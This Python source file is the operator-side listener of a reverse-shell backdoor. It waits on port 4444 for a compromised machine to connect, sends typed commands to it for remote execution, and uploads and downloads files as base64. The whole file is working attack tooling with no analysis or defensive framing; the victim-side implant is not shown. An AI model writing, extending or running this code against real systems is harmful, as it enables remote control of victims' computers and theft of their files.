import socket
import json
import base64

SERVER_IP = "SERVER_IP"  # Replace with your server's IP address
SERVER_PORT = 4444


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Connection established from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                chunk = self.connection.recv(1024)
                if not chunk:
                    raise ConnectionResetError("connection closed")
                json_data += chunk
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            raise SystemExit
        return self.reliable_receive()

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def run(self):
        while True:
            command = input(">> ").split(" ")
            if command[0] == "upload" and len(command) > 1:
                command.append(self.read_file(command[1]))
            result = self.execute_remotely(command)
            if command[0] == "download" and len(command) > 1:
                result = self.write_file(command[1], result)
            print(result)


if __name__ == "__main__":
    my_Listener = Listener(SERVER_IP, SERVER_PORT)
    my_Listener.run()